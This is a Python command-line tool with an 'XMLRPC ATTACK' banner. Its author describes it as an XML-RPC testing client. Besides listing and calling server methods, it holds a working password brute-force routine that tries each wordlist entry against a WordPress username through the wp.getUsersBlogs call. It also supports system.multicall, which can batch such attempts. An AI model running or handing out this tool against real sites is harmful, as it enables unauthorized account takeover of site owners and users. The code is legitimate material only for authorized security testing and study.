#!/usr/bin/python
import xmlrpc.client
import argparse

RED = "\033[1;31m"
GREEN = "\033[1;32m"
BLUE = "\033[1;34m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def banner():
    banners = """
    ██╗  ██╗███╗   ███╗██╗     ██████╗ ██████╗  ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
    ╚██╗██╔╝████╗ ████║██║     ██╔══██╗██╔══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
     ╚███╔╝ ██╔████╔██║██║     ██████╔╝██████╔╝██║         ███████║   ██║      ██║   ███████║██║     █████╔╝ 
     ██╔██╗ ██║╚██╔╝██║██║     ██╔══██╗██╔═══╝ ██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
    ██╔╝ ██╗██║ ╚═╝ ██║███████╗██║  ██║██║     ╚██████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
    ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   """
    
    info = """
    Author: muhzahidazmy
    Version: 1.0
    Description: Simple XML-RPC client for testing purposes. """
    print()
    print(RED + banners + RESET)
    print(BLUE + info + RESET)
    print()
def create_proxy(server_url):
    try:
        proxy = xmlrpc.client.ServerProxy(server_url)
        proxy.system.listMethods()
        return proxy
    except Exception as e:
        print(f"{RED}Error:{RESET} Failed to connect to server: {e}")
        exit(1)

def getMethods(proxy):
    try:
        methods = proxy.system.listMethods()
        print("Available methods:")
        for i, method in enumerate(methods, 1):
            print(f"{i}. {GREEN}{method}{RESET}")
    except Exception as e:
        print(f"{RED}Error:{RESET} Unable to retrieve methods: {e}")

def callMethod(proxy, method, params):
    try:
        if method == "system.multicall":
            if not params or len(params) % 2 != 0:
                print(f"{RED}Error:{RESET} 'system.multicall' requires pairs of method names and parameters.")
                return
            
            calls = []
            for i in range(0, len(params), 2):
                method_name = params[i]
                method_params = [params[i + 1]]
                calls.append({"methodName": method_name, "params": method_params})
            
            result = proxy.system.multicall(calls)
        else:
            result = getattr(proxy, method)(*params) if params else getattr(proxy, method)()
        
        print(f"{BLUE}Result of '{method}':{RESET} {result}")
    except xmlrpc.client.Fault as fault:
        print(f"{RED}Error:{RESET} {fault.faultString}")
    except AttributeError:
        print(f"{RED}Error:{RESET} Method '{method}' not found.")
    except Exception as e:
        print(f"{RED}Unexpected error:{RESET} {e}")

def brute_force(proxy, username, password_list):
    for password in password_list:
        try:
            print(f"{YELLOW}Trying password: {password}{RESET}")
            result = proxy.wp.getUsersBlogs(username, password)
            if isinstance(result, list): 
                print(f"{GREEN}Success:{RESET} Password '{password}' is valid!")
                return  
            else:
                print(f"{RED}Failed:{RESET} Password '{password}' is invalid.")
        except xmlrpc.client.Fault as fault:
            print(f"{RED}Error:{RESET} {fault.faultString}")
        except Exception as e:
            print(f"{RED}Unexpected error:{RESET} {e}")
    print(f"{RED}No valid password found.{RESET}")


if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(description="XML-RPC client")
    parser.add_argument("-u", "--url", required=True, help="URL of the XML-RPC server")
    parser.add_argument("-U", "--user", help="Username for brute force (required for brute force)")
    parser.add_argument("-P", "--passwords", help="File containing passwords for brute force")
    parser.add_argument("-l", "--list", action="store_true", help="List available methods")
    parser.add_argument("-m", "--method", help="Method to call")
    parser.add_argument("params", nargs="*", help="Parameters for the method (optional)")
    args = parser.parse_args()

    proxy = create_proxy(args.url)

if args.list:
    getMethods(proxy)
elif args.method:
    params = args.params if args.params else []
    callMethod(proxy, args.method, params)
elif args.user and args.passwords:
    try:
        with open(args.passwords, "r", encoding="utf-8") as f:
            password_list = [line.strip() for line in f.readlines()]
        brute_force(proxy, args.user, password_list)
    except FileNotFoundError:
        print(f"{RED}Error:{RESET} Password file not found.")
    except UnicodeDecodeError:
        print(f"{RED}Error:{RESET} Unable to decode the password file. Ensure it is UTF-8 encoded.")
    except Exception as e:
        print(f"{RED}Error:{RESET} {e}")
else:
    print(f"{YELLOW}Please specify either --list/-l to list methods, --method/-m to call a method, or --user/-U with --passwords/-P for brute force.{RESET}")
